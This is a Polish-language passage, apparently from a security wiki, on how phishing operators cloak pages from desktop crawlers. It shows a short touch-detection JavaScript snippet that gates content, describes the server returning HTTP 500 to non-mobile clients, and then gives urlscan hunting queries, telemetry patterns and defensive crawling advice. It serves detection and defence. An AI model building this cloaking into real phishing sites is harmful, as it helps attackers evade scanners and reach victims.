Operatorzy coraz częściej blokują swoje phishingowe ścieżki prostą kontrolą urządzenia, tak aby desktopowe crawlery nigdy nie docierały do końcowych stron. Powszechny wzorzec to mały skrypt, który testuje, czy DOM obsługuje touch, i wysyła wynik do endpointu serwera; klienci niemobilni otrzymują HTTP 500 (lub pustą stronę), podczas gdy użytkownicy mobilni widzą pełen przepływ.

Minimalny fragment klienta (typowa logika):
```html
<script src="/static/detect_device.js"></script>
```
`detect_device.js` logika (uproszczona):
```javascript
const isMobile = ('ontouchstart' in document.documentElement);
fetch('/detect', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({is_mobile:isMobile})})
.then(()=>location.reload());
```
Często obserwowane zachowanie serwera:
- Ustawia cookie sesyjne podczas pierwszego załadowania.
- Akceptuje `POST /detect {"is_mobile":true|false}`.
- Zwraca 500 (lub placeholder) dla kolejnych GET, gdy `is_mobile=false`; serwuje phishing tylko jeśli `true`.

Heurystyki wykrywania i poszukiwań:
- Zapytanie urlscan: `filename:"detect_device.js" AND page.status:500`
- Telemetria sieciowa: sekwencja `GET /static/detect_device.js` → `POST /detect` → HTTP 500 dla urządzeń niemobilnych; prawidłowe ścieżki ofiar na urządzeniach mobilnych zwracają 200 z następnym HTML/JS.
- Blokuj lub dokładnie sprawdzaj strony, które uzależniają treść wyłącznie od `ontouchstart` lub podobnych testów urządzenia.

Wskazówki obronne:
- Uruchamiaj crawlers z fingerprintami przypominającymi urządzenia mobilne i włączonym JS, aby odsłonić zastrzeżoną treść.
- Wysyłaj alerty o podejrzanych odpowiedziach 500 następujących po `POST /detect` na świeżo zarejestrowanych domenach.

## Źródła

- [https://zeltser.com/domain-name-variations-in-phishing/](https://zeltser.com/domain-name-variations-in-phishing/)
- [https://0xpatrik.com/phishing-domains/](https://0xpatrik.com/phishing-domains/)
- [https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/](https://darkbyte.net/robando-sesiones-y-bypasseando-2fa-con-evilnovnc/)
- [https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy](https://www.digitalocean.com/community/tutorials/how-to-install-and-configure-dkim-with-postfix-on-debian-wheezy)
- [2025 Unit 42 Global Incident Response Report – Social Engineering Edition](https://unit42.paloaltonetworks.com/2025-unit-42-global-incident-response-report-social-engineering-edition/)
- [Silent Smishing – mobile-gated phishing infra and heuristics (Sekoia.io)](https://blog.sekoia.io/silent-smishing-the-hidden-abuse-of-cellular-router-apis/)
- [The Next Frontier of Runtime Assembly Attacks: Leveraging LLMs to Generate Phishing JavaScript in Real Time](https://unit42.paloaltonetworks.com/real-time-malicious-javascript-through-llms/)
- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)

{{#include ../../banners/hacktricks-training.md}}
